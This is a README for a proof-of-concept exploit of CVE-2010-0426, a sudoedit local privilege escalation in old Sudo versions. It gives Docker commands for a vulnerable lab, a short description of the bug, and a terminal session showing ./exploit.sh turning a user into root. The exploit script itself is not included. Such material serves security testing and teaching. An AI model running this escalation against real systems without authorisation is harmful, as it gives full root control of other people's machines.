# Sudo 1.6.x<=1.6.9p21 and 1.7.x<=1.7.2p4 Local Privilege Escalation

Sudo (su "do") allows a system administrator to give certain users (or groups of users) the ability to run some (or all) commands as root while logging all commands and arguments.

## Vulnerable environment

To setup a vulnerable environment for your test you will need [Docker](https://docker.com) installed, and just run the following command:

    docker build -t privesc/cve-2010-0426 .
    docker run --rm -it privesc/cve-2010-0426

And it will spawn a interactive shell with low user privileges.

## Vulnerable code

The bug was found in sudoedit, which does not handle the 'sudoedit' command correctly, this allows a malicious user to replace the real sudoedit command with an arbitrary command.

Local attackers could exploit this issue to run arbitrary commands as the 'root' user. Successful exploits can completely compromise an affected computer.

## Exploit

To exploit this target just run:

    ./exploit.sh

If you are using this vulnerable image, you can just run:

	user@023b47ff82ca:~$ sudo -V
	Sudo version 1.7.2
	user@023b47ff82ca:~$ sudo -l
	User user may run the following commands on this host:
		(root) NOPASSWD: sudoedit /etc/fstab
	user@023b47ff82ca:~$ ./exploit.sh /etc/fstab
	[+] CVE-2010-0426 exploit by t0kx
	[+] Prepared sudoedit...
	[+] Run sudoedit
	root@023b47ff82ca:/tmp# id
	uid=0(root) gid=0(root) groups=0(root)
	root@023b47ff82ca:/tmp#


## Credits

This flaw was found by Slouching.

## Disclaimer

This or previous program is for Educational purpose **ONLY**. Do not use it without permission. The usual disclaimer applies, especially the fact that me (t0kx) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears **NO** responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not t0kx's responsibility.
